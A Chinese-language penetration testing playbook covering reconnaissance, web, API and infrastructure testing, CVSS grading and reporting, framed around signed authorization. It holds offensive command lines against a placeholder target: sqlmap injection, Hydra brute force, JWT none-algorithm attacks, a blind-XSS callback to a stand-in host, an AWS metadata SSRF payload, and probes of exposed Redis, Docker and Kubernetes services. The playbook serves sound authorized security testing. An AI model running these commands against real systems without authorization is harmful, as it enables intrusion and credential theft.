---
title: 渗透测试作战手册
version: 1.0.0
last_updated: 2026-03-28
owner: security-team
tags: [penetration-testing, OWASP, Burp-Suite, Nmap, ZAP, API-security, web-security]
status: production
domain: security
difficulty: intermediate
quality_score: 70
---

# 开发：Excellent（11964948@qq.com）
# 功能：渗透测试全流程作战手册
# 作用：指导安全团队完成 Web 应用、API、基础设施的渗透测试及报告编写
# 创建时间：2026-03-28
# 最后修改：2026-03-28

## 目标

建立渗透测试标准化流程，确保：
- 测试覆盖 OWASP Top 10 及 CWE Top 25 全部高危项
- 工具链（OWASP ZAP + Burp Suite + Nmap + Nuclei）配合人工验证形成完整测试矩阵
- 测试结果可复现、可追溯、可量化
- 发现漏洞 48 小时内完成分级并输出修复建议
- 测试报告符合 PCI-DSS / ISO 27001 审计要求

## 适用场景

- 新系统上线前安全验收
- 季度/年度例行安全评估
- 重大版本发布前回归安全测试
- 第三方系统接入前安全准入
- 安全事件后针对性渗透复测
- 合规审计要求的渗透测试证据产出

## 前置条件

### 环境要求

| 项目 | 最低要求 |
|------|---------|
| 操作系统 | Kali Linux 2024+ / Ubuntu 22.04+ / macOS 13+ |
| 内存 | 16 GB（Burp Suite + 浏览器并行） |
| 网络 | 目标环境网络可达，代理端口不被防火墙拦截 |
| 授权 | 已签署渗透测试授权书（含范围、时间、免责条款） |

### 工具链安装

```bash
# OWASP ZAP（自动化扫描主力）
sudo apt install zaproxy
# 或 Docker 方式
docker pull ghcr.io/zaproxy/zaproxy:stable

# Nmap（端口扫描与服务探测）
sudo apt install nmap

# Nuclei（漏洞模板扫描）
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
nuclei -update-templates

# SQLMap（SQL 注入自动化）
sudo apt install sqlmap

# ffuf（目录/参数爆破）
go install github.com/ffuf/ffuf/v2@latest

# httpx（HTTP 探测）
go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest

# Burp Suite（手动测试主力 — 需单独下载 Professional 版）
# https://portswigger.net/burp/releases
```

### 授权与合规检查清单

- [ ] 渗透测试授权书已签署且在有效期内
- [ ] 测试范围（IP / 域名 / API 端点）已明确列出
- [ ] 排除范围（生产数据库直连、第三方 SaaS）已明确
- [ ] 测试时间窗口已与运维团队对齐
- [ ] 应急联系人与回滚方案已确认
- [ ] 数据处理协议（测试中获取的敏感数据销毁方式）已签署

---

## 一、信息收集阶段

### 1.1 被动信息收集

```bash
# DNS 枚举
subfinder -d target.com -o subdomains.txt
httpx -l subdomains.txt -o alive-hosts.txt

# WHOIS 与 DNS 记录
whois target.com
dig target.com ANY +noall +answer
dig target.com MX +short
dig target.com TXT +short

# 证书透明度日志
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sort -u

# 技术栈指纹（被动）
whatweb https://target.com
# Wappalyzer 浏览器插件辅助确认
```

### 1.2 主动端口扫描

```bash
# 快速 TCP 全端口扫描
nmap -sS -p- --min-rate 5000 -oA nmap-tcp-full target.com

# 详细服务版本探测（针对开放端口）
nmap -sV -sC -p 22,80,443,3306,6379,8080 -oA nmap-service target.com

# UDP 常见端口
nmap -sU --top-ports 100 -oA nmap-udp target.com

# 操作系统指纹
nmap -O --osscan-guess target.com

# 漏洞脚本扫描
nmap --script=vuln -p 80,443 target.com
```

### 1.3 目录与路径发现

```bash
# ffuf 目录爆破
ffuf -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raf-medium-directories.txt \
  -mc 200,301,302,403 -o ffuf-dirs.json -of json

# 常见敏感路径检测
ffuf -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -mc 200 -fs 0

# API 端点发现
ffuf -u https://api.target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
  -mc 200,401,403 -o ffuf-api.json -of json

# robots.txt / sitemap.xml
curl -s https://target.com/robots.txt
curl -s https://target.com/sitemap.xml
```

---

## 二、Web 应用测试

### 2.1 OWASP ZAP 自动化扫描

```bash
# ZAP 全自动扫描（Docker 方式）
docker run --rm -v $(pwd):/zap/wrk ghcr.io/zaproxy/zaproxy:stable \
  zap-full-scan.py -t https://target.com -r zap-report.html -J zap-report.json

# ZAP API 扫描（针对 OpenAPI/Swagger）
docker run --rm -v $(pwd):/zap/wrk ghcr.io/zaproxy/zaproxy:stable \
  zap-api-scan.py -t https://api.target.com/openapi.json -f openapi -r zap-api-report.html

# ZAP 基线扫描（快速，仅被动扫描）
docker run --rm -v $(pwd):/zap/wrk ghcr.io/zaproxy/zaproxy:stable \
  zap-baseline.py -t https://target.com -r zap-baseline.html
```

### 2.2 Burp Suite 手动测试流程

**配置步骤：**

1. 启动 Burp Suite Professional，确认代理监听 `127.0.0.1:8080`
2. 浏览器配置代理指向 Burp，安装 Burp CA 证书
3. 开启 Intercept，逐页面浏览目标应用建立 Site Map
4. 配置 Scope：仅包含目标域名，排除第三方资源

**关键测试项（OWASP Top 10 对照）：**

| OWASP 编号 | 风险类别 | Burp 测试方法 |
|-----------|---------|-------------|
| A01 | 访问控制失效 | 修改请求中 userId/role 参数，尝试越权访问 |
| A02 | 加密失败 | 检查 HTTPS 配置、敏感数据明文传输、弱哈希 |
| A03 | 注入 | Intruder 模块对所有输入点 fuzz，SQLi/XSS/SSTI |
| A04 | 不安全设计 | 业务逻辑测试：跳步/重放/竞态条件 |
| A05 | 安全配置错误 | 检查默认凭据/调试接口/目录列举/CORS |
| A06 | 脆弱过时组件 | Scanner 模块识别已知 CVE |
| A07 | 认证失败 | 暴力破解/弱密码/会话固定/Token 可预测 |
| A08 | 数据完整性失败 | 反序列化注入/CI-CD 管道安全 |
| A09 | 日志监控不足 | 确认安全事件是否被记录 |
| A10 | SSRF | Collaborator 检测出站请求 |

### 2.3 注入测试详细步骤

```bash
# SQL 注入自动化检测
sqlmap -u "https://target.com/api/users?id=1" --batch --level=3 --risk=2 \
  --output-dir=sqlmap-results --forms --crawl=2

# 带认证 Token 的 SQL 注入
sqlmap -u "https://target.com/api/orders?status=active" \
  --headers="Authorization: Bearer <token>" \
  --batch --level=3 --risk=2 --tamper=space2comment

# XSS 检测（使用 Dalfox）
dalfox url "https://target.com/search?q=test" --blind https://your-callback.xss.ht

# SSTI 检测
# 手动在输入字段注入: {{7*7}} / ${7*7} / #{7*7}
# 预期返回 49 即确认存在模板注入
```

### 2.4 认证与会话测试

```bash
# 暴力破解（Hydra）
hydra -l admin -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt \
  target.com http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials"

# JWT 分析
# 1. 解码 JWT
echo "<jwt-token>" | jwt_tool -d
# 2. 尝试 None 算法攻击
jwt_tool "<jwt-token>" -X a
# 3. 尝试密钥爆破
jwt_tool "<jwt-token>" -C -d /usr/share/seclists/Passwords/jwt-secrets.txt

# 会话管理测试
# - 登录后记录 Session ID，登出后尝试复用
# - 并发登录同一账号，检查是否互踢
# - 修改 Cookie 中的用户标识字段尝试越权
```

---

## 三、API 安全测试

### 3.1 API 枚举与文档收集

```bash
# 常见 API 文档路径探测
for path in /swagger.json /openapi.json /api-docs /swagger-ui.html /redoc /graphql; do
  status=$(curl -s -o /dev/null -w "%{http_code}" "https://api.target.com${path}")
  echo "${path}: ${status}"
done

# GraphQL 内省查询
curl -s -X POST https://api.target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name fields { name } } } }"}' | jq .
```

### 3.2 API 特有漏洞测试

```yaml
# 测试矩阵
BOLA（越权对象访问）:
  - GET /api/users/123 → 修改为 /api/users/124 验证是否可越权
  - 遍历 ID 批量验证

BFLA（越权功能访问）:
  - 普通用户 Token 调用管理员接口
  - DELETE /api/users/123 应返回 403

批量分配（Mass Assignment）:
  - 注册时额外提交 role=admin / isVerified=true
  - 更新个人信息时提交 balance=99999

速率限制:
  - 单接口 60 秒内发送 1000 请求，观察是否被限流
  - 检查 429 响应是否生效

数据过度暴露:
  - 检查 API 响应中是否包含密码哈希/内部 ID/PII
  - 对比前端展示字段与 API 返回字段
```

### 3.3 Nuclei 漏洞模板扫描

```bash
# 全模板扫描
nuclei -u https://target.com -o nuclei-results.txt

# 按严重程度筛选
nuclei -u https://target.com -severity critical,high -o nuclei-critical.txt

# 自定义模板（检测特定 CVE）
nuclei -u https://target.com -t ~/nuclei-templates/cves/2024/ -o nuclei-cve-2024.txt

# 批量目标扫描
nuclei -l alive-hosts.txt -severity critical,high -rate-limit 50 -o nuclei-batch.txt
```

---

## 四、基础设施测试

### 4.1 SSL/TLS 配置检测

```bash
# testssl.sh 全面检测
testssl.sh --html https://target.com

# 关键检查项
# - 证书有效期与链完整性
# - TLS 1.0/1.1 是否仍启用（应禁用）
# - 弱密码套件（RC4/DES/3DES）
# - HSTS 头是否设置
# - OCSP Stapling 状态

# Nmap SSL 脚本
nmap --script ssl-enum-ciphers -p 443 target.com
```

### 4.2 常见服务漏洞检测

```bash
# Redis 未授权访问
redis-cli -h target.com -p 6379 INFO

# MongoDB 未授权访问
mongosh --host target.com --port 27017 --eval "db.adminCommand('listDatabases')"

# Elasticsearch 未授权访问
curl -s http://target.com:9200/_cat/indices

# Docker API 暴露
curl -s http://target.com:2375/version

# Kubernetes API 暴露
curl -sk https://target.com:6443/api/v1/namespaces
```

### 4.3 云环境特定测试

```bash
# AWS 元数据服务 SSRF
# 在输入字段注入: http://169.254.169.254/latest/meta-data/
# IMDSv2 绕过测试

# S3 Bucket 权限检测
aws s3 ls s3://target-bucket --no-sign-request

# Azure Blob 匿名访问
curl -s "https://targetaccount.blob.core.windows.net/container?restype=container&comp=list"
```

---

## 五、漏洞分级与评估

### 5.1 CVSS 3.1 评分标准

| 等级 | CVSS 分数 | SLA 修复时限 | 示例 |
|------|----------|-------------|------|
| 严重 (Critical) | 9.0-10.0 | 24 小时 | RCE / SQL 注入获取全库 / 认证绕过 |
| 高危 (High) | 7.0-8.9 | 72 小时 | 存储型 XSS / IDOR 批量数据泄露 / SSRF 内网探测 |
| 中危 (Medium) | 4.0-6.9 | 7 天 | 反射型 XSS / CSRF / 信息泄露 |
| 低危 (Low) | 0.1-3.9 | 30 天 | 缺少安全头 / 目录列举 / 版本信息泄露 |
| 信息 (Info) | 0.0 | 按需 | 最佳实践建议 |

### 5.2 漏洞验证原则

- 每个发现必须有可复现的 PoC（截图 + 请求/响应）
- 自动化扫描的发现必须经过人工确认去除误报
- 同一根因的多个表现归并为一个漏洞项
- 利用链（Attack Chain）中的多个漏洞需同时记录独立风险与组合风险

---

## 六、报告编写

### 6.1 报告结构模板

```markdown
# 渗透测试报告

## 1. 执行摘要
- 测试时间：2026-03-20 至 2026-03-25
- 测试范围：*.target.com, API v2
- 发现总览：严重 2 / 高危 5 / 中危 8 / 低危 12 / 信息 3
- 整体风险等级：高
- 关键发现：[一句话描述最严重的漏洞及其影响]

## 2. 测试范围与方法
- 测试目标清单（IP/域名/API 端点）
- 排除项
- 使用的工具与版本
- 测试方法论（OWASP Testing Guide v4.2 / PTES）

## 3. 漏洞详情（按严重程度排序）
### 3.1 [漏洞名称]
- **CVSS 评分**：9.2（Critical）
- **影响范围**：/api/v2/users
- **漏洞描述**：[技术描述]
- **复现步骤**：[请求/响应截图]
- **影响分析**：[数据泄露/服务中断/权限提升]
- **修复建议**：[具体代码/配置修改方案]
- **参考链接**：[CWE/CVE 编号]

## 4. 修复优先级路线图
| 阶段 | 时间 | 漏洞 | 负责方 |
|------|------|------|--------|
| P0 | 24h | 严重漏洞列表 | 安全+开发 |
| P1 | 72h | 高危漏洞列表 | 开发 |
| P2 | 7d  | 中危漏洞列表 | 开发 |

## 5. 附录
- 完整扫描日志
- 工具配置文件
- 授权书副本
```

### 6.2 报告质量检查

- [ ] 所有漏洞均有 CVSS 评分
- [ ] 所有漏洞均有可复现的 PoC
- [ ] 修复建议具体到代码/配置级别，而非泛泛的建议
- [ ] 报告中不包含测试用的账号密码或真实敏感数据
- [ ] 测试授权信息完整
- [ ] 使用的工具版本已记录

---

## 七、回滚与应急

### 当测试导致目标异常时

```bash
# 1. 立即停止所有扫描工具
pkill -f nmap; pkill -f sqlmap; pkill -f nuclei; pkill -f ffuf

# 2. 通知运维团队
# 联系方式应在测试前确认并记录

# 3. 提供异常时间点与操作日志
# ZAP / Burp 均有完整请求日志，导出后提供给运维

# 4. 协助恢复
# - 确认异常是否由测试流量引起
# - 如涉及数据修改，提供精确的请求记录用于回滚
```

### 数据安全

```bash
# 测试完成后清理
# 1. 销毁测试过程中获取的敏感数据
shred -vfz -n 5 sqlmap-results/*
rm -rf nuclei-results.txt zap-report.json

# 2. 从 Burp Suite 中清除项目文件
# File → Project → Delete Project

# 3. 清除浏览器中缓存的目标数据
# 清空代理历史与 Cookie

# 4. 确认本地无残留敏感数据后签署数据销毁确认书
```

---

## 八、验证

### 复测验证流程

```bash
# 1. 确认修复版本已部署
curl -s https://target.com/health | jq .version

# 2. 针对每个已修复漏洞重新执行 PoC
# - 使用与原始测试完全相同的工具与参数
# - 记录修复前后的请求/响应对比

# 3. 回归测试
# - 修复是否引入新漏洞
# - 相邻功能是否受影响

# 4. 更新报告状态
# 将漏洞状态从 Open 改为 Fixed/Verified，附上复测时间与验证截图
```

### 渗透测试成功标准

| 指标 | 达标标准 |
|------|---------|
| OWASP Top 10 覆盖率 | 10/10 测试项均已执行 |
| 误报率 | < 5% |
| 严重/高危漏洞 | 复测后全部关闭 |
| 报告交付时间 | 测试结束后 3 个工作日内 |
| PoC 可复现率 | 100% |

---

## Agent Checklist

供自动化 Agent 在执行渗透测试流程时逐项核查：

- [ ] 渗透测试授权书已签署且在有效期内
- [ ] 测试范围与排除范围已明确记录
- [ ] 工具链已安装并更新至最新版本
- [ ] 被动信息收集已完成（子域名/DNS/证书）
- [ ] Nmap 端口扫描已完成并记录开放端口
- [ ] 目录与路径发现已完成
- [ ] OWASP ZAP 自动化扫描已执行
- [ ] Burp Suite 手动测试覆盖 OWASP Top 10
- [ ] SQL 注入 / XSS / SSTI 注入测试已完成
- [ ] 认证与会话安全测试已完成
- [ ] API 安全测试（BOLA/BFLA/批量分配/速率限制）已完成
- [ ] Nuclei 漏洞模板扫描已完成
- [ ] SSL/TLS 配置已检测
- [ ] 基础设施常见漏洞已检测
- [ ] 所有发现均已人工确认去除误报
- [ ] CVSS 评分已为每个漏洞计算
- [ ] 报告按标准模板编写完成
- [ ] 测试数据已安全销毁
- [ ] 复测已验证所有严重/高危漏洞已修复